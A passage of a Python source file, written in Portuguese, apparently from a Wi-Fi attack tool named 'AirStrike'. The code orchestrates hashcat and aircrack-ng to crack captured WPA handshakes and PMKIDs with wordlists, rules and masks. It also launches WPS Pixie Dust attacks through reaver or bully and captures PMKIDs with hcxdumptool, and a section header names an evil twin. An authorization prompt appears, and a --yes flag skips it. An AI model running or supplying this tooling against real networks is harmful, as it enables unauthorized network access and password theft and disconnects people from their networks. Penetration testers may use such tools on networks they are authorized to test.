    # -- render -----------------------------------------------------------
    def _linha(self, grade, nome, valor):
        grade.add_row(nome, valor)

    def _render(self):
        from rich.panel import Panel
        from rich.table import Table
        from rich.text import Text

        s = self.estado
        g = Table.grid(padding=(0, 2))
        g.add_column(justify="right", style="bold cyan", no_wrap=True)
        g.add_column()
        self._linha(g, "Alvo", self.rotulo or "-")
        self._linha(g, "Ataque", self.ataque or "-")

        devs = s.get("devices") or []
        vel = sum((d.get("speed") or 0) for d in devs)
        dev_txt = []
        for d in devs[:2]:
            nome = (d.get("device_name") or "?")
            nome = re.sub(r"^cpu-[a-z0-9]+-", "", nome)
            partes = ["%s %s" % (d.get("device_type") or "?", nome[:30])]
            if d.get("util") not in (None, -1):
                partes.append("%s%%" % d.get("util"))
            if d.get("temp") not in (None, -1, 0):
                partes.append("%s C" % d.get("temp"))
            dev_txt.append(" · ".join(partes))
        self._linha(g, "Backend", " | ".join(dev_txt) or "-")
        self._linha(g, "Velocidade", _fmt_vel(vel) if devs else "-")

        prog = s.get("progress") or []
        testadas = prog[0] if prog else None
        total = prog[1] if len(prog) > 1 else self.total
        if testadas is None:
            self._linha(g, "Testadas", "-")
        elif total:
            pct = min(100.0, 100.0 * testadas / float(total))
            cheio = int(30 * pct / 100.0)
            barra = Text()
            barra.append("█" * cheio, style="green")
            barra.append("░" * (30 - cheio), style="dim")
            barra.append(" %4.1f%%" % pct)
            self._linha(g, "Testadas",
                        "%s / %s" % (_fmt_num(testadas), _fmt_num(total)))
            self._linha(g, "", barra)
        else:
            self._linha(g, "Testadas", _fmt_num(testadas))

        rec_hash = (s.get("recovered_hashes") or [0])
        rec_salt = (s.get("recovered_salts") or [0])
        rec = (rec_hash[0] if rec_hash else 0) + (rec_salt[0] if rec_salt else 0)
        estilo = "bold green" if rec else "white"
        self._linha(g, "Achadas", Text(_fmt_num(rec), style=estilo))

        t0 = s.get("time_start")
        tfim = s.get("estimated_stop")
        if t0 and tfim:
            agora = time.time()
            self._linha(g, "Tempo",
                        "decorridos %s · faltam %s" %
                        (fmt_tempo(max(0, agora - t0)),
                         fmt_tempo(max(0, tfim - agora))))
        return Panel(g, title="[bold]AirStrike - quebra ao vivo[/bold]",
                     border_style="cyan")


def crack_hashcat(hash_file, wordlist, extra_args=None, rules=None,
                  mask=None, custom=None, increment=False,
                  rotulo=None, total=None):
    """Quebra um .22000 com o hashcat (-m 22000). Devolve a chave ou None.

    Com mask faz ataque de mascara (-a 3); sem mask usa a wordlist (-a 0),
    opcionalmente com regras do hashcat (-r arquivo).
    """
    if not os.path.exists(hash_file):
        err(f"arquivo de hashes nao encontrado: {hash_file}")
        return None

    out_file = os.path.splitext(hash_file)[0] + "_chave.txt"
    try:
        if os.path.exists(out_file):
            os.remove(out_file)
    except OSError:
        pass

    ataque = ("mascara %s" % mask) if mask else \
        ("wordlist %s" % os.path.basename(wordlist or "?")) + \
        (" + regras" if rules else "")
    painel = PainelHashcat(rotulo=rotulo, ataque=ataque, total=total)
    cmd = ["hashcat", "-m", "22000", "-a", "3" if mask else "0",
           "--status", "--status-timer=%d" % (2 if painel.ativo else 15),
           "--outfile", out_file, "--outfile-format", "2"]
    if painel.ativo:
        cmd += ["--status-json"]
    if extra_args:
        cmd += list(extra_args)
    if rules and not mask:
        cmd += ["-r", rules]
    if mask:
        if custom:
            for flag in sorted(custom):
                cmd += [flag, custom[flag]]
        if increment:
            cmd += ["--increment", "--increment-min", "1"]
        cmd += [hash_file, mask]
    else:
        cmd += [hash_file, wordlist]
    info(f"testando senhas (hashcat): {' '.join(cmd)}")
    print(paint("-" * 60, Color.CYAN))

    rc, sem_backend = 0, False
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            encoding="utf-8",
            errors="replace",
        )
        with painel:
            for line in proc.stdout:
                for parte in line.replace("\r", "\n").split("\n"):
                    p = parte.strip()
                    if not p:
                        continue
                    if painel.ativo:
                        if p.startswith("{"):
                            try:
                                painel.linha_json(json.loads(p))
                            except ValueError:
                                pass
                        elif any(t in p for t in ("ERROR", "error", "Hashfile",
                                                  "Exhausted", "Cracked",
                                                  "Recovered", "Approaching")):
                            painel.aviso(p)
                    else:
                        if any(t in p for t in ("Status", "Cracked", "Exhausted",
                                                "Recovered", "Approaching",
                                                "Hashfile", "ERROR", "error",
                                                "No password hashes", "Backend",
                                                "Kernel", "CUDA", "OpenCL",
                                                "INFO", "Speed", "Progress")):
                            print(parte)
                    if ("No OpenCL, HIP or CUDA" in p or "clGetPlatformIDs" in p
                            or "No devices found" in p or "no devices left" in p.lower()):
                        sem_backend = True
        rc = proc.wait()
    except KeyboardInterrupt:
        warn("quebra interrompida pelo usuario")
        try:
            proc.kill()
        except Exception:
            pass

    print(paint("-" * 60, Color.CYAN))

    if sem_backend and rc != 0:
        raise RuntimeError("hashcat encerrou sem testar nenhuma senha "
                           "(sem backend OpenCL/HIP/CUDA)")

    chave = None
    if os.path.isfile(out_file):
        try:
            with open(out_file, "r", encoding="utf-8", errors="replace") as fh:
                chave = next((l.strip() for l in fh if l.strip()), None)
        except OSError:
            pass
    if chave is None:
        # Senha ja encontrada antes fica no potfile; o --show a recupera
        show_file = out_file + ".show"
        try:
            if os.path.exists(show_file):
                os.remove(show_file)  # o --show acumula se deixar la
        except OSError:
            pass
        run(["hashcat", "-m", "22000", "--show", "--outfile", show_file,
             "--outfile-format", "2", hash_file], timeout=60)
        if os.path.isfile(show_file):
            try:
                with open(show_file, "r", encoding="utf-8", errors="replace") as fh:
                    chave = next((l.strip() for l in fh if l.strip()), None)
            except OSError:
                pass
    return chave


# ---------------------------------------------------------------------------
# Lista de senhas (rockyou)
# ---------------------------------------------------------------------------

def prepare_wordlist(path):
    """Garante que a lista de senhas existe (descompacta o .gz se preciso)."""
    if path and os.path.isfile(path):
        ok(f"lista de senhas: {path}")
        return path

    gz = (path or DEFAULT_WORDLIST) + ".gz"
    if os.path.isfile(gz):
        info(f"descompactando {gz} (gzip -dk, mantem o original)")
        rc, _ = run(["gzip", "-dk", gz], timeout=300)
        if rc == 0 and os.path.isfile(path):
            ok(f"lista de senhas pronta: {path}")
            return path
        warn("nao foi possivel descompactar automaticamente; rode manualmente:")
        warn(f"  sudo gzip -dk {gz}")

    return None


# ---------------------------------------------------------------------------
# Quebra de senha (aircrack-ng)
# ---------------------------------------------------------------------------

def crack(cap_file, wordlist, bssid):
    """Roda o aircrack-ng em tempo real. Devolve a chave encontrada ou None."""
    if not os.path.exists(cap_file):
        err(f"arquivo de captura nao encontrado: {cap_file}")
        return None

    log_file = os.path.splitext(cap_file)[0] + "_chave.txt"
    cmd = ["aircrack-ng", "-b", bssid, "-w", wordlist, "-l", log_file, cap_file]
    info(f"testando senhas: {' '.join(cmd)}")
    print(paint("-" * 60, Color.CYAN))

    chave = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            encoding="utf-8",
            errors="replace",
        )
        buffer = ""
        for line in proc.stdout:
            for parte in line.replace("\r", "\n").split("\n"):
                if not parte.strip():
                    continue
                m = KEY_FOUND_RE.search(parte)
                if m:
                    chave = m.group(1)
                # Mostra apenas linhas uteis (evita o spam de progresso)
                if any(t in parte for t in ("KEY FOUND", "KEY RECOVERED", "handshake",
                                            "dictionary", "quitting", "keys tested",
                                            "Passphrase", "Attempting", "Opening", "Read ")):
                    print(parte)
        proc.wait()
    except KeyboardInterrupt:
        warn("quebra interrompida pelo usuario")
        try:
            proc.kill()
        except Exception:
            pass

    print(paint("-" * 60, Color.CYAN))

    if chave is None and os.path.isfile(log_file):
        try:
            with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
                chave = fh.read().strip() or None
        except OSError:
            pass
    return chave


# ---------------------------------------------------------------------------
# Pipeline de quebra: mascaras, estimativa de tempo e frentes em fila
# ---------------------------------------------------------------------------

def _charset_size(cs):
    """Tamanho de um charset do hashcat (ex.: '?l?d' = 36, 'abc' = 3)."""
    total = 0
    i = 0
    while i < len(cs):
        if cs[i] == "?" and i + 1 < len(cs):
            tok = cs[i:i + 2]
            total += CHARSET_SIZES.get(tok, 1)
            i += 2
            continue
        total += 1
        i += 1
    return total


def mask_keyspace(mask, custom=None, increment=False):
    """Espaco de busca de uma mascara hashcat (numero de combinacoes)."""
    tamanhos = dict(CHARSET_SIZES)
    if custom:
        for flag, cs in custom.items():
            # no hashcat o charset -1 e referenciado na mascara como ?1
            token = "?" + flag.lstrip("-")
            tamanhos[token] = max(1, _charset_size(cs))

    def _tokens(m):
        toks = []
        i = 0
        while i < len(m):
            if m[i] == "?" and i + 1 < len(m):
                toks.append(m[i:i + 2])  # token inteiro: ?d, ?l, ?1...
                i += 2
            else:
                toks.append(m[i])  # literal = posicao fixa
                i += 1
        return toks

    def _calc_toks(toks):
        total = 1
        for t in toks:
            if t in tamanhos:
                total *= tamanhos[t]
        return total

    toks = _tokens(mask)
    if increment:
        # --increment testa de 1 ate o tamanho cheio, sempre por token
        return sum(_calc_toks(toks[:n]) for n in range(1, len(toks) + 1))
    return _calc_toks(toks)


def parse_masks(spec):
    """Expande presets e mascaras crus. Devolve [(nome, mask, custom, incr)]."""
    itens = []
    for tok in [t.strip() for t in (spec or "").split(",") if t.strip()]:
        if tok in MASK_PRESETS:
            itens.extend(MASK_PRESETS[tok])
        else:
            itens.append((tok, tok, None, False))
    return itens


def count_lines(path):
    n = 0
    try:
        with open(path, "rb") as fh:
            for _ in fh:
                n += 1
    except OSError:
        pass
    return n


def fmt_tempo(segundos):
    if not segundos or segundos < 1:
        return "<1s"
    if segundos < 60:
        return f"{int(segundos)}s"
    if segundos < 3600:
        return f"{segundos / 60:.0f}min"
    if segundos < 86400:
        return f"{segundos / 3600:.1f}h"
    return f"{segundos / 86400:.1f}dias"


def print_estimate(frentes, hspeed):
    """Mostra o espaco de busca e o tempo estimado de cada frente."""
    print()
    print(paint("  Frente                         Espaco      Tempo estimado", Color.BOLD))
    print("  " + "-" * 66)
    total = 0
    for f in frentes:
        ks = f.get("keyspace") or f.get("senhas") or 0
        total += ks
        tempo = fmt_tempo(ks / hspeed) if hspeed else "?"
        nome = f["nome"][:31]
        print("  %-32s %13s %15s" % (nome, "{:,}".format(ks).replace(",", "."), tempo))
    print("  " + "-" * 66)
    print("  %-32s %13s %15s" % ("TOTAL", "{:,}".format(total).replace(",", "."),
                                 fmt_tempo(total / hspeed) if hspeed else "?"))
    info("calculo com %s hashes/s (ajuste com --hspeed ou meca com --bench)" %
         ("{:,}".format(int(hspeed)).replace(",", ".") if hspeed else "?"))
    print()


def hashcat_sem_backend():
    """True se o hashcat nao tem plataforma OpenCL/HIP/CUDA (nao testa nada)."""
    rc, out = run(["hashcat", "-I"], timeout=60)
    return rc != 0 or "Backend Device ID" not in out


def hashcat_somente_cpu():
    """True quando o hashcat so tem dispositivos CPU (PoCL e companhia)."""
    rc, out = run(["hashcat", "-I"], timeout=60)
    tipos = re.findall(r"Type\.{2,}\s*:\s*(\S+)", out)
    return bool(tipos) and all(t.lower() == "cpu" for t in tipos)


BENCH_CACHE = os.path.expanduser("~/.airstrike_bench")


def velocidade_em_cache():
    try:
        with open(BENCH_CACHE, encoding="utf-8") as fh:
            return float(fh.read().strip())
    except (OSError, ValueError):
        return None


def salvar_velocidade_cache(valor):
    try:
        with open(BENCH_CACHE, "w", encoding="utf-8") as fh:
            fh.write("%.0f\n" % valor)
    except OSError:
        pass


def benchmark_speed():
    """Mede a velocidade real do hashcat no modo 22000 (hashcat -b)."""
    if not shutil.which("hashcat"):
        return None
    info("medindo a velocidade real do hashcat (hashcat -b -m 22000, ~40s)...")
    rc, out = run(["hashcat", "-b", "-m", "22000", "--runtime=40"], timeout=300)
    m = re.search(r"Speed\.#\S*:\s*([\d.]+)\s*([kMG]?H)/s", out)
    if not m:
        if "No OpenCL" in out or "clGetPlatformIDs" in out:
            warn("hashcat sem backend OpenCL/GPU; corrija com: "
                 "sudo apt install pocl-opencl-icd")
        return None
    mult = {"": 1, "k": 1e3, "M": 1e6, "G": 1e9}.get(m.group(2), 1)
    return float(m.group(1)) * mult


def crack_pipeline(hash_file, cap_file, wordlist, bssid, cracker, args):
    """Roda as frentes de quebra em fila, da mais barata a mais cara.

    Frente 1: wordlist (opcionalmente com regras --rules)
    Frentes seguintes: mascaras hashcat (-a 3) de --masks
    + frente de incremento numerico com --increment.
    Ctrl+C pula para a proxima frente.
    Devolve a chave ou None.
    """
    tem_hashcat = bool(cracker == "hashcat" and shutil.which("hashcat")
                       and os.path.isfile(hash_file))
    if cracker == "hashcat" and not tem_hashcat:
        warn("hashcat ou hashes 22000 indisponiveis; somente a wordlist sera testada")
    if tem_hashcat and hashcat_sem_backend():
        err("hashcat instalado, mas sem backend OpenCL/HIP/CUDA: ele encerra SEM testar senha nenhuma")
        warn("corrija com:  sudo apt install pocl-opencl-icd   (OpenCL via CPU)")
        warn("seguindo somente com a wordlist via aircrack-ng; frentes de mascara ficam de fora")
        tem_hashcat = False

    frentes = []
    nome_wl = os.path.basename(wordlist) if wordlist else "(sem wordlist)"
    frentes.append({"nome": "wordlist %s%s" % (nome_wl, " + regras" if args.rules else ""),
                    "senhas": count_lines(wordlist) if wordlist else 0,
                    "tipo": "wordlist"})

    masks = parse_masks(args.masks)
    if args.increment:
        masks.append(("incremento 1..8", "?d" * 8, None, True))
    if masks and not tem_hashcat:
        warn("frentes de mascara ignoradas: instale o hashcat (sudo apt install hashcat)")
    for nome, mask, custom, incr in masks:
        if not tem_hashcat:
            break
        frentes.append({"nome": "mascara %s" % nome, "tipo": "mascara",
                        "keyspace": mask_keyspace(mask, custom, incr),
                        "mask": mask, "custom": custom, "increment": incr})

    hspeed = args.hspeed
    if args.bench:
        medido = benchmark_speed()
        if medido:
            hspeed = medido
            ok("velocidade medida: %s hashes/s" %
               "{:,}".format(int(hspeed)).replace(",", "."))
        else:
            warn("nao foi possivel medir a velocidade; usando o valor de --hspeed")
    elif tem_hashcat and hashcat_somente_cpu():
        # em CPU o padrao de 150k H/s mente por 30x: mede uma vez e guarda
        medido = velocidade_em_cache()
        if medido:
            hspeed = medido
            ok("velocidade real em cache (%s): %s hashes/s" %
               (BENCH_CACHE, "{:,}".format(int(hspeed)).replace(",", ".")))
        else:
            medido = benchmark_speed()
            if medido:
                hspeed = medido
                salvar_velocidade_cache(medido)
                ok("velocidade medida e salva em cache: %s hashes/s" %
                   "{:,}".format(int(hspeed)).replace(",", "."))
            else:
                warn("nao foi possivel medir; usando o valor de --hspeed")

    print_estimate(frentes, hspeed)

    for f in frentes:
        info(f"abrindo frente: {f['nome']}  (Ctrl+C pula para a proxima)")
        chave = None
        try:
            if f["tipo"] == "wordlist":
                if tem_hashcat:
                    chave = crack_hashcat(hash_file, wordlist,
                                          shlex.split(args.hashcat_args or ""),
                                          rules=args.rules,
                                          rotulo=bssid,
                                          total=None if args.rules else f["senhas"])
                else:
                    if args.rules:
                        warn("--rules ignorado: aircrack-ng nao entende regras do hashcat")
                    chave = crack(cap_file, wordlist, bssid)
            else:
                chave = crack_hashcat(hash_file, None,
                                      shlex.split(args.hashcat_args or ""),
                                      mask=f["mask"], custom=f["custom"],
                                      increment=f["increment"],
                                      rotulo=bssid, total=f.get("keyspace"))
        except RuntimeError as exc:
            err(f"frente '{f['nome']}' falhou: {exc}")
            warn("instale um backend e rode de novo:  sudo apt install pocl-opencl-icd")
            warn("a captura continua salva; a frente NAO foi testada, apenas abortada:")
            warn(f"  hashcat -m 22000 -a 3 {hash_file} ?d?d?d?d?d?d?d?d")
            return None
        if chave:
            return chave
        info(f"frente {f['nome']} esgotada")
    return None


def save_result(out_dir, bssid, essid, key):
    path = os.path.join(out_dir, "resultado_%s.txt" % time.strftime("%Y%m%d_%H%M%S"))
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("Data: %s\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
            fh.write("BSSID: %s\n" % bssid)
            fh.write("ESSID: %s\n" % (essid or "(oculta)"))
            fh.write("Chave: %s\n" % key)
        ok(f"resultado salvo em {path}")
    except OSError as exc:
        warn(f"nao foi possivel salvar o resultado: {exc}")


# ---------------------------------------------------------------------------
# Quebra sobre captura existente (sem nova captura)
# ---------------------------------------------------------------------------

def list_caps(out_dir):
    """Sessoes de captura (prefixos *.cap) na pasta de saida, mais recentes antes.

    O airodump pode dividir uma sessao em -01.cap, -02.cap...; agrupa pelo
    prefixo e devolve o caminho sem o sufixo -NN.cap.
    """
    por_prefixo = {}
    try:
        nomes = os.listdir(out_dir)
    except OSError:
        return []
    for n in nomes:
        m = re.match(r"^(.*)-(\d+)\.cap$", n)
        if not m:
            continue
        pref = os.path.join(out_dir, m.group(1))
        try:
            quando = os.path.getmtime(os.path.join(out_dir, n))
        except OSError:
            continue
        if pref not in por_prefixo or quando > por_prefixo[pref]:
            por_prefixo[pref] = quando
    return sorted(por_prefixo, key=lambda p: por_prefixo[p], reverse=True)


def caps_do_prefixo(prefixo):
    """Arquivos -NN.cap de uma sessao, em ordem (-01.cap, -02.cap, ...)."""
    pasta = os.path.dirname(prefixo) or "."
    base = os.path.basename(prefixo)
    try:
        nomes = os.listdir(pasta)
    except OSError:
        return []
    pedacos = []
    for n in nomes:
        m = re.match(r"^%s-(\d+)\.cap$" % re.escape(base), n)
        if m:
            pedacos.append((int(m.group(1)), os.path.join(pasta, n)))
    return [c for _, c in sorted(pedacos)]


def redes_no_cap(cap_files):
    """Redes vistas na(s) captura(s), pela tabela de redes do aircrack-ng."""
    rc, out = run(["aircrack-ng"] + list(cap_files), timeout=120)
    redes = []
    for line in out.splitlines():
        m = re.match(r"\s*\d+\s+([0-9A-Fa-f:]{17})\s+(.+?)\s{2,}(\S.*)$", line)
        if not m:
            continue
        enc = m.group(3).strip()
        handshakes = 0
        mh = re.search(r"\((\d+)\s+handshake", enc)
        if mh:
            handshakes = int(mh.group(1))
        redes.append({"bssid": m.group(1).upper(), "essid": m.group(2).strip(),
                      "enc": enc, "handshakes": handshakes})
    return redes


def essid_do_22000(valor):
    """ESSID do campo do formato 22000.

    hashcat/hcx 7.x gravam o ESSID em hex cru (ex.: 43424e = 'CBN');
    versoes antigas usavam texto puro ou $HEX[...].
    """
    m = re.fullmatch(r"\$HEX\[([0-9A-Fa-f]+)\]", valor)
    if m:
        valor = m.group(1)
    if re.fullmatch(r"[0-9A-Fa-f]+", valor) and len(valor) % 2 == 0:
        try:
            texto = bytes.fromhex(valor).decode("utf-8")
            if texto and all(0x20 <= ord(c) <= 0x7e for c in texto):
                return texto
        except ValueError:
            pass
    return valor


def info_22000(path):
    """BSSID/ESSID do primeiro hash de um .22000 (WPA*tipo*h*AP*STA*ESSID*...)."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                campos = line.strip().split("*")
                if len(campos) < 6 or campos[0] != "WPA":
                    continue
                mac = campos[3]
                bssid = (":".join(mac[i:i + 2] for i in range(0, 12, 2)).upper()
                         if re.fullmatch(r"[0-9A-Fa-f]{12}", mac) else mac)
                return bssid, essid_do_22000(campos[5])
    except OSError:
        pass
    return None, None


def escolher_captura(caps):
    """Menu das sessoes de captura; devolve o prefixo escolhido ou None."""
    pasta = os.path.dirname(caps[0]) or "."
    print()
    print(paint("  #   Captura (pasta: %s)" % pasta, Color.CYAN))
    print("  " + "-" * 58)
    for i, pref in enumerate(caps, 1):
        pedacos = caps_do_prefixo(pref)
        quando = ""
        if pedacos:
            quando = time.strftime("%d/%m/%Y %H:%M",
                                   time.localtime(os.path.getmtime(pedacos[0])))
        extra = " (%d caps)" % len(pedacos) if len(pedacos) > 1 else ""
        print("  %-3d %-38s %s%s" % (i, os.path.basename(pref), quando, extra))
    print("  " + "-" * 58)
    try:
        resp = input("Numero da captura (Enter = pular, nova captura): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if resp.isdigit() and 1 <= int(resp) <= len(caps):
        return caps[int(resp) - 1]
    return None


def escolher_rede_do_cap(cap_files):
    """Menu das redes dentro da captura; devolve o dict da rede ou None."""
    redes = redes_no_cap(cap_files)
    if not redes:
        err("nenhuma rede reconhecida nessa captura")
        return None
    print()
    print(paint("  #   BSSID              ESSID                      Handshake", Color.CYAN))
    print("  " + "-" * 58)
    for i, r in enumerate(redes, 1):
        hs = "%d handshake" % r["handshakes"] if r["handshakes"] else "--"
        print("  %-3d %s  %-26s %s" % (i, r["bssid"],
                                       (r["essid"] or "(oculta)")[:26], hs))
    print("  " + "-" * 58)
    try:
        resp = input("Numero da rede a quebrar (Enter desiste): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if resp.isdigit() and 1 <= int(resp) <= len(redes):
        return redes[int(resp) - 1]
    return None


def crack_captura_existente(arquivo, args):
    """Quebra sobre captura ja feita, sem ligar nenhuma antena.

    Aceita o .cap da sessao (ex.: captures/captura_20261015_115942-01.cap),
    o prefixo da sessao, ou um .22000 direto. Devolve o codigo de saida.
    """
    arquivo = os.path.abspath(arquivo)
    if not os.path.exists(arquivo):
        # aceita o PREFIXO da sessao (sem -NN.cap), como o menu entrega:
        # reencontra o primeiro .cap dos pedacos daquela sessao
        pedacos = caps_do_prefixo(arquivo)
        if pedacos:
            arquivo = pedacos[0]
        else:
            err(f"captura nao encontrada: {arquivo}")
            return 1

    alvo = None
    if arquivo.lower().endswith(".22000"):
        prefixo = arquivo[:-6]
        hash_file = arquivo
        cap_files = caps_do_prefixo(prefixo)
        bssid, essid = info_22000(arquivo)
        if bssid:
            info(f"hashes de {essid or '?'} [{bssid}] em {arquivo}")
    else:
        prefixo = re.sub(r"-\d+\.cap$", "", arquivo, flags=re.IGNORECASE)
        cap_files = caps_do_prefixo(prefixo) or [arquivo]
        info(f"lendo {len(cap_files)} arquivo(s) de captura: "
             f"{', '.join(os.path.basename(c) for c in cap_files)}")
        alvo = escolher_rede_do_cap(cap_files)
        if alvo is None:
            info("nenhuma rede selecionada. Encerrando.")
            return 0
        bssid, essid = alvo["bssid"], alvo["essid"]
        hash_file = prefixo + ".22000"

    if not bssid:
        err("nao consegui identificar o BSSID do hash/captura")
        return 1
    ok(f"alvo: {essid or '(oculta)'} [{bssid}]")

    enc = (alvo or {}).get("enc", "").upper()
    wordlist = prepare_wordlist(args.wordlist)
    if wordlist is None:
        if not sys.stdin.isatty():
            err("lista de senhas nao encontrada; informe com --wordlist")
            return 1
        try:
            resp = input("Caminho de outra lista de senhas (Enter para abortar): ").strip()
        except (EOFError, KeyboardInterrupt):
            resp = ""
        wordlist = resp if resp and os.path.isfile(resp) else None
    if wordlist is None:
        warn("sem lista de senhas; nada foi testado")
        return 1

    if "WEP" in enc:
        info("rede WEP: aircrack-ng tenta recuperar a chave direto da captura")
        chave = crack(cap_files[0], wordlist, bssid)
        if chave:
            ok(paint("CHAVE ENCONTRADA: %s" % chave, Color.BOLD + Color.GREEN))
            save_result(args.out, bssid, essid, chave)
            return 0
        warn("chave WEP nao encontrada com esta lista")
        return 2

    if os.path.isfile(hash_file):
        pmkid_n, eapol_n = count_hashes_in_22000(hash_file, bssid)
    else:
        pmkid_n = eapol_n = 0
    if not (pmkid_n or eapol_n):
        extr = extract_22000(cap_files, hash_file, bssid)
        if extr is None:
            warn("hcxpcapngtool ausente: extracao PMKID/EAPOL desativada "
                 "(sudo apt install hcxtools)")
        else:
            pmkid_n, eapol_n = extr
    if pmkid_n or eapol_n:
        ok(f"hashes prontos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
    else:
        err("essa captura nao tem handshake nem PMKID dessa rede: sem dados para quebrar")
        warn("faca uma nova captura (no inicio, responda 'n') com --capture-time maior")
        return 1

    cracker = args.cracker
    if cracker == "auto":
        cracker = "hashcat" if shutil.which("hashcat") else "aircrack"
    if cracker == "hashcat" and not shutil.which("hashcat"):
        warn("hashcat ausente; usando aircrack-ng no .cap")
        cracker = "aircrack"
    if cracker == "aircrack" and not cap_files:
        err("sem .cap na pasta para o aircrack-ng; instale o hashcat (sudo apt install hashcat)")
        return 1

    chave = crack_pipeline(hash_file, cap_files[0] if cap_files else None,
                           wordlist, bssid, cracker, args)
    if chave:
        ok(paint("CHAVE ENCONTRADA: %s" % chave, Color.BOLD + Color.GREEN))
        save_result(args.out, bssid, essid, chave)
        return 0

    warn("chave nao encontrada nesta captura. Isso NAO significa que a rede e 'invulneravel':")
    warn("  - a senha pode nao estar na lista")
    info("para tentar de novo sem recapturar:")
    info(f"  sudo airstrike --crack {cap_files[0] if cap_files else hash_file}")
    return 2


# ---------------------------------------------------------------------------
# Entrada interativa
# ---------------------------------------------------------------------------

def choose_target(redes, args):
    """Escolhe o alvo: automático (--bssid) ou menu interativo."""
    if args.bssid:
        bssid = args.bssid.upper()
        for r in redes:
            if r["bssid"] == bssid:
                return r
        if args.channel:
            warn(f"{bssid} nao apareceu na varredura; usando canal manual {args.channel}")
            return {"bssid": bssid, "channel": str(args.channel), "privacy": "WPA2",
                    "cipher": "CCMP", "auth": "PSK", "power": "?", "ivs": 0,
                    "essid": args.essid or "", "clients": 0}
        err(f"{bssid} nao foi encontrada na varredura; informe tambem --channel")
        sys.exit(1)

    if not redes:
        err("nenhum alvo para escolher")
        sys.exit(1)
    if not sys.stdin.isatty():
        err("sem terminal interativo: use --bssid (e --channel se necessario)")
        sys.exit(1)

    try:
        resp = input("Numero do alvo (ou Enter para sair): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if not resp:
        return None
    try:
        idx = int(resp)
    except ValueError:
        err("entrada invalida")
        return None
    if not 1 <= idx <= len(redes):
        err("numero fora do intervalo")
        return None
    return redes[idx - 1]


def confirm_authorization(args):
    if args.yes:
        warn("--yes informado: voce atesta ter autorizacao para testar estas redes")
        return
    print(paint("=" * 60, Color.YELLOW))
    print(paint("  AVISO: teste apenas em redes PROPRIAS ou com AUTORIZACAO", Color.YELLOW))
    print(paint("  EXPLICITA do responsavel. O teste de desconexao derruba", Color.YELLOW))
    print(paint("  dispositivos conectados e pode ser ilegal sem autorizacao.", Color.YELLOW))
    print(paint("=" * 60, Color.YELLOW))
    try:
        resp = input("Digite AUTORIZADO para continuar: ").strip()
    except (EOFError, KeyboardInterrupt):
        resp = ""
    if resp != "AUTORIZADO":
        err("confirmacao nao recebida. Abortando.")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Pacote de poder: WPS Pixie Dust, PMKID dedicado e evil twin
# ---------------------------------------------------------------------------

def wps_probe(mon_iface, bssid, channel, tempo=15):
    """Detecta o estado WPS do alvo com o wash.

    Devolve 'unlocked', 'locked' ou None (WPS ausente/indeterminado).
    """
    if not shutil.which("wash"):
        return None
    try:
        proc = subprocess.Popen(
            ["wash", "-i", mon_iface, "-c", str(channel), "-s"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL, encoding="utf-8", errors="replace",
        )
        # le por tempo limitado: o wash fica rodando
        linhas = []
        def _le():
            try:
                for line in proc.stdout:
                    linhas.append(line)
            except Exception:
                pass
        t = threading.Thread(target=_le, daemon=True)
        t.start()
        time.sleep(tempo)
        proc.kill()
    except OSError:
        return None
    for line in linhas:
        if bssid.lower() not in line.lower():
            continue
        baixo = line.lower()
        if re.search(r"locked\s*:?\s*no\b", baixo):
            return "unlocked"
        if re.search(r"locked\s*:?\s*yes\b", baixo):
            return "locked"
        return "unlocked"  # WPS presente sem indicacao de trava
    return None


def wps_pixie(mon_iface, bssid, channel, timeout=90):
    """Pixie Dust com o reaver (fallback bully). Devolve (pin, senha)."""
    cmd = ["reaver", "-i", mon_iface, "-b", bssid, "-c", str(channel),
           "-K", "1", "-vv"]
    ferramenta = "reaver"
    if not shutil.which("reaver"):
        if not shutil.which("bully"):
            warn("reaver e bully ausentes: WPS Pixie Dust indisponivel "
                 "(sudo apt install reaver)")
            return (None, None)
        cmd = ["bully", "-b", bssid, "-c", str(channel), "-d", mon_iface]
        ferramenta = "bully"
    info(f"pixie dust via {ferramenta}: {' '.join(cmd)} (ate {timeout}s)")
    try:
        rc, out = run(cmd, timeout=timeout)
    except (subprocess.TimeoutExpired, OSError):
        return (None, None)
    mpin = re.search(r"WPS PIN:\s*'(\d{4,8})'", out) or \
           re.search(r"Pin is '(\d{4,8})'", out, re.I)
    mpsk = re.search(r"WPA PSK:\s*'(.+?)'", out) or \
           re.search(r"key:?\s*=\s*(\S+)", out, re.I)
    return (mpin.group(1) if mpin else None, mpsk.group(1) if mpsk else None)


def pmkid_dedicado(mon_iface, bssid, channel, timeout, out_prefix):
    """PMKID/EAPOL com o hcxdumptool no canal do alvo (sem deauth, sem cliente).

    Devolve (pmkid, eapol) contados do .22000 gerado; (0, 0) se nada saiu.
    """
    if not shutil.which("hcxdumptool"):
        warn("hcxdumptool ausente: PMKID dedicado pulado (sudo apt install hcxdumptool)")
        return (0, 0)
    pcapng = out_prefix + "_hcx.pcapng"
    hash_file = out_prefix + ".22000"
    info("PMKID dedicado (hcxdumptool): canal %s, sem deauth; Ctrl+C pula" % channel)
    try:
        proc = subprocess.Popen(
            ["hcxdumptool", "-i", mon_iface, "-w", pcapng, "-c", str(channel)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
    except OSError as exc:
        warn(f"hcxdumptool nao iniciou: {exc}")
        return (0, 0)
    got = (0, 0)
    try:
        prazo = time.time() + timeout
        while time.time() < prazo:
            if proc.poll() is not None:
                warn("hcxdumptool terminou antes do prazo (interface ocupada? driver recusa?)")
                break
            if os.path.exists(pcapng) and os.path.getsize(pcapng) > 200:
                extr = extract_22000(pcapng, hash_file, bssid)
